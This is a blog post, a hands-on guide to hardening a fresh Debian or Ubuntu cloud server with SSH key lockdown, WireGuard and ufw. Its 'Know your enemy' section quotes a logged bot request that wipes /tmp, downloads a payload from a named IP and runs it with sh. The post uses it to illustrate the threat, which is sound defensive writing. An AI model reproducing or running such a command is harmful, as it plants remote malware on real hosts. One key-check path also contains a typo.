---
title_tag: "The Reluctant Sysadmin's Guide to Securing a Linux Server"
title: "The Reluctant Sysadmin's Guide to Securing a Linux Server"
subtitle: "How to harden Linux when you don't really want to"
description: "This guide covers the basics of hardening a new Linux virtual machine when you'd rather be doing something else."
image: aws-launch.png
image_caption: Successful AWS VM launch.
date: 2023-04-02T00:00:00Z
lastmod: 2023-07-01
draft: false
type: post
related:
- /posts/follow-up-to-the-reluctant-sysadmin
- /posts/how-not-to-store-passwords
discussions:
- url: https://news.ycombinator.com/item?id=36934052
  site: Hacker News
---
{{< img
    src="aws-launch.png"
    alt="Successful AWS VM launch"
    srcset="aws-launch-275.png 275w, aws-launch-350.png 350w, aws-launch.png 490w"
    sizes="(max-width: 390px) 275px, (max-width: 520px) 350px, 490px" >}}

_I wrote a [follow-up](/posts/follow-up-to-the-reluctant-sysadmin) to this guide, which you should probably consider along with this article._

I'm not a sysadmin, and I don't want to be. But I write software for the web, which means I'm never far from a server, and sometimes I'm the only one around. So even if I didn't want the job, I have it, and I need to take the security of these hosts seriously. If you're in a similar situation, this guide is for you. I'll walk you through the steps I use to harden a new virtual machine from a cloud provider.

Ideally, you would automate everything here. But this is a manual guide, where I assume you'll be typing the commands. I know people still manually configure servers, and if you're going to do it, at least do it securely. But I hope after you've gone through this once or twice, you'll automate it. I'll have more to say about automation at the end.

I'm making a few assumptions to keep this post brief:
- Your host is a VM from a cloud provider (AWS, GCP, Linode, etc.) with a standard machine image.
- Your server has Debian 11 (Bullseye) or Ubuntu. The same basic procedure should work with any Linux distribution, but the details will vary.
- You know your way around the Linux shell (if you can navigate directories and edit files, you'll be fine).

## Know your enemy
Before we get into it, we need to know what we're up against, and first up are bots. As an experiment, I started a VM in AWS and enabled SSH passwords, and started an HTTP server. After only an hour, I had one failed SSH login and a dozen requests for things like:
```
GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.231/jaws;sh+/tmp/jaws
```

I don't know what `jaws` does, but it doesn't sound friendly. (Hopefully, it's obvious, but don't run that--if you really must, I reversed the last octet of the IP address.)

These bots scan the Internet looking for any vulnerable systems. The good news is that they're not out to get you so much as they're out to get anyone. These attacks are usually easy to stop, keep your host updated, and be a little bit tougher than the next host on their list.

But sometimes, there is someone out to get you personally, and sadly no system is truly safe. The best we can do is block what's known, put up defenses at every layer, and hope we've become more trouble than we're worth. On that cheery note, let's dive in.

## Update the software
Even if you just launched it, your system is probably already outdated. There might even be a critical security vulnerability that didn't make it into the VM image. So to start:

```sh
sudo apt update
sudo apt upgrade
```

## Create a user account
You should not log in directly as `root`. Use another account and `sudo` when you need superuser access. Your cloud VM likely has another account already, which you can use, if you wish. But I prefer to make a new account because the default one tends to be obvious.

```bash
sudo useradd -m -s /bin/bash \
  -G users,sudo \
  alfred
```

Name your account whatever you like, but avoid anything easily guessable, like `admin`.

The `-G` line lists groups that the user belongs to. The `sudo` group will grant access to run commands as `root` (assuming `sudo` is configured this way, which it usually is).

You'll need a password for this account. You won't log in with this password, but you will need it for `sudo`, so pick a good one. Ideally, generate a random one in your password manager. To set the password:
```bash
sudo passwd alfred
```

If your VM image disables password logins with SSH, copy the key from the default account to your new account:

```sh
cp -r ~{admin,alfred}/.ssh
chown -R alfred:alfred ~alfred/.ssh/
```

Log out and back in as your new user and verify that sudo works:

```bash
sudo bash -c 'echo "I am $USER!"'
```

It should ask for your password. If it works without a password, then run `sudo visudo` and replace the line that begins with `%sudo` with:

```
%sudo   ALL=(ALL:ALL) ALL
```

Make sure `sudo` works before moving on because you can lock yourself out of `root` if you're not careful.

We don't want to leave old unused accounts around. So if there's a default account from your VM image, delete it:

```bash
sudo userdel admin
```

## Disable root logins
Now that we have an account with `sudo` privileges, there's no reason anyone should log in with `root`. First, disable root at the console:

```bash
sudo passwd -l root
```

Now prevent `root` from logging in over SSH. Add (or uncomment) this line in `/etc/ssh/sshd_config`:

```
PermitRootLogin no
```

You will have to restart `sshd` for the change to take effect, but we'll have a few more SSH config changes. If you're anxious to do it now, run:

```bash
sudo systemctl restart ssh
```

## `umask`
We need to change the default `umask`, which controls the permissions on new files and directories. Most Linux distributions default `umask` to `022`, which gives read access to every user. Run `umask` to see your current setting.

We want a `umask` of `077`, which removes access to every user except the one who created the file. `027` would work, too (full access for the owner, read for group, and nothing for other). The point is that it's safer to loosen file permissions when needed rather than tighten them.

For `sh` and `bash`, we can add `umask` to `/etc/profile`:
```sh
sudo bash -c 'echo -e "\numask 077" >> /etc/profile'
```

If you use another shell, I will assume you know where to configure it.

Log out and back in, then verify new files have the desired permissions:

```sh
$ touch xyz ; ls -l xyz ; rm xyz
-rw------- 1 alfred alfred 0 Mar 25 11:23 xyz
```

## SSH keys
I know you, and I always use new, randomly generated passwords for every account, but most people don't. Someday you may grant access to someone with bad password hygiene, so it's best to start right and only allow logins by SSH key. Your cloud provider probably already configured an SSH key for you, but don't skip this section because the default settings still need to be tweaked.

If you have an SSH key already that you want to use, then great. If not, and you're on Linux or Mac, generate one:
```bash
ssh-keygen -t rsa -b 4096
```

If you're on Windows, [PuTTYgen](https://www.puttygen.com/) should work (but don't ask me about it because I've never used it).

Back on the server now. By default, SSH reads authorized keys from `$HOME/.ssh/authorized_keys`. The problem is that if an attacker finds an exploit that lets them write one file, you can be sure they'll attempt to add a public key to `$HOME/.ssh/authorized_keys`. It's safer if only `root` can add an SSH key.

We need a central place to keep public keys:

```
sudo mkdir -p /etc/ssh/authorized_keys
sudo chmod 0711 /etc/ssh/authorized_keys
```

The permissions on the directory give `root` full access. Everyone else can read files but not create them or even get a directory listing.

We'll create one file in this directory for each user with SSH access. If you already have an `authorized_keys` file, you can copy it into place:

```
sudo cp ~alfred/.ssh/authorized_keys /etc/ssh/authorized_keys/alfred
```

If not, paste the public key:

```
sudo bash -c 'echo your public ssh key > /etc/ssh/authorized_keys/alfred'
```

The last step is to make the file readable by the user:

```
sudo setfacl -m u:alfred:r /etc/ssh/authorized_keys/alfred
```

If `setfacl` doesn't exist, install it with `sudo apt install acl`.

Before continuing, make sure that your user can read their `authorized_keys` file:

```
cat /etc/ssh/authorized/keys/$USER
```

If you can't read it now, SSH won't be able to read it from your account either, and you'll be locked out.

Now configure SSH to read public keys from our central directory by adding this to `/etc/ssh/sshd_config`:

```
AuthorizedKeysFile /etc/ssh/authorized_keys/%u
```

While we're editing `sshd_config`, we also want to disable password logins (this may already be set):

```
PasswordAuthentication no
```

Restart `sshd` for those changes to take effect:

```sh
sudo systemctl restart ssh
```

Don't log out yet. But do log in from another terminal window to make sure it works.

If you have an old `authorized_keys` file, delete it: `rm ~/.ssh/authorized_keys` (it isn't insecure, it's just confusing to leave an unused file in place).

## WireGuard
We've done the basics to lock down SSH. But, ideally, SSH would not be accessible from the Internet. You could use firewall rules to restrict access to specific IP addresses. But in my case, I have a dynamic IP, and I don't want to run a bastion host, so that won't work for me. Fortunately, [WireGuard](https://www.wireguard.com/) makes running a VPN easy.

If you haven't heard of it, WireGuard is a peer-to-peer VPN. There isn't a central server. On each host, you set the public keys of its authorized peers. It's a little bit work to configure, but it works well.

One drawback to WireGuard is that the connection goes both ways. If your server is compromised, the attacker can reach any configured peer. Personally, I have the other side of the WireGuard tunnel in a local VM that blocks inbound connections from the tunnel.

However you do it, I will assume you have some other host already configured with WireGuard. Before we get started, you'll need:

- The public key and private IP of the peer you want to connect from.
- The private IP to assign to the server. It should be in the same subnet as the peer.

Start by installing WireGuard. It's simple in Debian Bullseye and recent Ubuntu versions:

```sh
sudo apt install wireguard 
```

Now generate a key pair:

```
sudo mkdir -p /etc/wireguard
sudo sh -c 'wg genkey | tee /etc/wireguard/private_key | wg pubkey > /etc/wireguard/public_key'
```

And create a config file in `/etc/wireguard/wg0.conf`:

```
[Interface]
Address = 192.168.50.2/24
PrivateKey = <THE PRIVATE KEY>
ListenPort = 12345

[Peer]
PublicKey = u8Uo3ab+psKeOpciUIaNuBulNrOCXrU8GN3yD06/0WM=
AllowedIPs = 192.168.50.1/32
```

You'll need to set the address to an IP on the same subnet as the computer you're accessing it from. Also, configure the correct `AllowedIPs` and `PublicKey`. You can copy/paste the `PrivateKey`, or use `:r /etc/wireguard/private_key` in VIM.

Set `ListenPort` to any random ephemeral port number. You can generate one in Bash:

```sh
echo $(($SRANDOM % 55535 + 10000))
```

The port number isn't a secret per se, but WireGuard hides itself well, so we might as well prevent an attacker from knowing it.

If your cloud provider has a firewall, don't forget to open WireGuard's UDP port.

Now start WireGuard:
```sh
sudo systemctl start wg-quick@wg0
sudo systemctl enable wg-quick@wg0
```

Don't forget to configure the server as a peer on the computer you're connecting from. Make sure you can connect to SSH through the WireGuard IP.

## Firewall
Your cloud provider probably has a firewall already. If you're happy with that, allow WireGuard, block SSH, and call it a day. But if you don't don't like that firewall, you can install one on the server.

On Debian based systems, I use `ufw`. Install it with:

```sh
sudo apt install ufw
```

The first rule we need allows anyone to access the WireGuard port. Change `$WG_PORT` to whatever you configured in `/etc/wireguard/wg0.conf`:

```sh
sudo ufw allow in on eth0 to any port $WG_PORT proto udp
```

Also run `ip a` and make sure the interface you want to filter is actually `eth0`, sometimes it may not be.

Now we want to allow SSH on WireGuard:
```sh
sudo ufw allow in on wg0 to any port 22 proto tcp
```

And add any other ports you want open:

```sh
sudo ufw allow in on eth0 to any port 80 proto tcp
sudo ufw allow in on eth0 to any port 443 proto tcp
```

When your rules are in place, cross your fingers and turn on `ufw`:
```sh
sudo ufw enable
```

With any luck, SSH remains connected. Don't log out until you confirm you can get a new SSH connection.

## Next steps
There are a few more things you should consider:
- Find a process to keep your system up to date. Debian's [Automatic Update](https://wiki.debian.org/AutomatedUpgrade) is one option, though you may want some oversight.
- Most attacks won't be against what we've covered in this guide, but against the applications you install next. Properly done, containers can limit the impact.

Finally, you should automate the job of initializing your host. With practice, this process can be done manually in about 30 minutes, but your automation will be a couple of minutes at most. Manually typing the commands is also error-prone, and a few steps can lock you out if you aren't careful.

If you aren't sure where to start with automation, I suggest you start simple. For example, write an init script that gets your host to a known state before Ansible (or a similar tool) takes over.

If you want to use an init script, I have published some [scripts](https://github.com/pboyd/initscripts) which do everything in this blog post, which you can use directly or as a base for what you really need.
